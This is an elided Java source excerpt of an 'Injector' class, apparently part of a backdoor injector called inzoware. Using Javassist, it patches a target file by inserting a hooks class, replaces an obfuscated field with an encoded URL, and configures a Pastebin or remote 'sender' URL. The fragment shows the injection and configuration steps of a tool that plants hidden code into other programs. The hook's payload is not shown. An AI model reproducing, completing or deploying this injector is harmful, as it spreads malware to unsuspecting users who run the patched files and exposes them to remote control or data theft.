...
public class Injector {
    ...
    public static boolean patchFile(String orig, String out, SimpleConfig config, boolean override, boolean quiet) throws NotFoundException {
        ...
        if(config.pastebinurl){
            try{
                ...
                pool.appendClassPath(new ClassClassPath(com.inzo.technologies.inzoware.hooks.Hooks374.class));
                CtClass cc = pool.get(HooksClass);
                CtField m = cc.getField("IIllIlIll");
                cc.removeField(m);
                System.out.println("[Injector] Removed Field IIllIlIll ");
                CtField newField = CtField.make("public static final String IIllIlIll=\""+ EncodedURL +"\";", cc);
            ...
            try{
                ...
                pool.appendClassPath(orig);
                pool.appendClassPath(new ClassClassPath(com.inzo.technologies.inzoware.hooks.Hooks374.class));
                CtClass pt = pool.get(HooksClass);
        ...
        /*--- Write new Hooks374 class ---*/

        if(!quiet)
            System.out.println("[Injector] Writing Hooks374 class.");
        Path patchedFile        = null;
        Path target             = null;

        try {
            patchedFile = Paths.get("temp/" + HooksClass.replace(".", "/") + ".class");
    ...
    public static class SimpleConfig {
        ...
        public SimpleConfig(boolean b1, String s1) {
            pastebinurl = b1;
            encodedSenderURL = s1;
        }
    }
    ...
    private static String[] resource_paths_required = {
            ...
            "com.inzo.technologies.inzoware.Main"
    };
}
